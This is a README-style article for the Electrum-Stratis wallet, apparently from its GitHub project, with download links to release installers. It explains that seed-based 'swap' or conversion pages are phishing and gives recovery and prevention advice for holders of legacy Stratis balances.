![Electrum-Stratis](assets/banner-article.png)

# There is no page for swapping with an old seed, because it never existed

<p align="center">The missing page</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

A conversion does not need your seed, and no legitimate process ever asked for one. If a search brings you to a page offering to "swap with your old seed", the page is describing something that was never part of the migration and cannot be: a seed derives keys, and a conversion credits an address, which requires nothing secret. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| The page says | What it wants | What it actually is |
|---|---|---|
| "Paste your seed to convert" | Your keys | Phishing |
| "Restore here, then we swap" | A wallet under their control | Theft with extra steps |
| "Old seeds convert at 1:10" | Belief in a live process | History dressed as a service |
| "Enter the phrase to check eligibility" | The phrase | The phrase is never the check |
| "Seed-based migration tool" | Everything | A fake tool |

</div>

Eligibility, if it was ever checked, was checked against an address and a balance. Both are public. The secret was never the input.

## Why it happens

The request is plausible because seeds are how wallets are restored, and a user who has just restored a wallet has the phrase in mind. Scams borrow that context: the page looks like a wallet screen, the instructions mention the same words, and the ask arrives at the moment the phrase is already on the clipboard.

The technical fact that defeats it is simple. A conversion is an accounting operation against an address; it needs to know what you held, and the chain already says that. Asking for the seed adds no information the operator did not have, which is why no honest process asked.

## Fix

1. **Reject the premise.** There is no seed-based conversion, and a page that offers one is not describing a product. Close it.
2. **Never type the phrase into a website.** A phrase belongs in a wallet's restore screen, on your machine, for a restore you started. Everywhere else it is a key handed to a stranger.
3. **If you already pasted it, move the coins now.** New wallet, new phrase, sweep the balance. Do not wait to see whether the page was real.
4. **Check what the request would even accomplish.** A conversion credits an address. Nothing about that requires a secret, so a demand for one is the whole tell.
5. **Keep the phrase offline.** If it is not typed, it cannot be phished, keylogged or pasted into the wrong window.

The same pattern appears with wallet files. A page that asks you to upload the encrypted file "so we can check it" is asking for the thing the password protects, and a page that asks for both has everything. The file alone is not a key, and the password alone is not a key; the pair is, which is why requests for the pair are requests for the wallet. A fake conversion page is not a wallet, and no build of this software asks for a phrase to perform a conversion; the wallet is actively maintained, with the current release on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19). What a phrase actually does is [what an Electrum Stratis seed restores](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/is-the-seed-enough-to-restore.md).

Deleting the page is not enough if the phrase was entered. The phrase is compromised the moment it leaves your paper, and a phrase typed into a page has left it permanently, whatever the page does next. That is why the only safe moment to stop is before the first keystroke.

## If that did not work

If the funds have already moved, document the addresses, the transaction IDs and the page, and report it. No recovery service can reverse a signed transaction, and the ones that claim to are the same fraud in a different costume.

If you are unsure whether a page was legitimate, ask what it did with the phrase. There is no answer that survives scrutiny, because the operation never needed it.

If a wallet prompts for a seed at startup and you did not choose Restore, the prompt is not the wallet. Close it and open the application yourself.

## Prevention

- Never enter a seed on a website, in a chat, or in a form.
- Restore only from a wallet you launched, for a restore you chose.
- Treat conversion offers that mention seeds as fraud by definition.
- Keep the phrase on paper, never in a note or a photo.
- Teach the rule to anyone who holds a legacy balance.
- Treat a page that asks for a phrase as the fraud itself, not as a step in a process.

## FAQ

### Did the swap ever require a seed phrase?

No. A conversion credits an address, and the address and its balance are public. The seed was never an input, which is why no legitimate page asked for one and why every page that did was fraudulent.

### I found a site offering to swap with my old seed. Is it real?

No. It is a phishing page built on the fact that seeds restore wallets. The process it describes does not exist, and the only thing it can accomplish is handing your keys to whoever runs it.

### What if I already entered the seed?

Create a new wallet immediately, write the new phrase on paper, and sweep the entire balance into it. Do not reuse the exposed phrase, and do not wait for the site to respond before moving.

### Can a wallet swap coins for me using its seed?

No. A wallet holds keys and signs transactions; it cannot issue an asset from another chain. A conversion needs a counterparty, and no wallet can substitute for one that has stopped operating.

<!-- DOWNLOAD-BLOCK -->

There is no seed-based swap page because the wallet never performed swaps. The conversion was a separate service that read a deposit and credited a balance on another chain, and it closed. A page that offers to convert with a phrase is imitating a process that does not exist, and the phrase it collects is the entire purpose of the page.

## Related articles

- [Seed entry was never necessary](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/why-no-flow-needs-a-seed.md)
- [The swap is closed](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/the-conversion-window-is-closed.md)
- [The scam variants aimed at wallet holders](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/scams-that-promise-funds-back.md)
- [What can be stolen from a wallet](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/what-a-thief-can-actually-take.md)
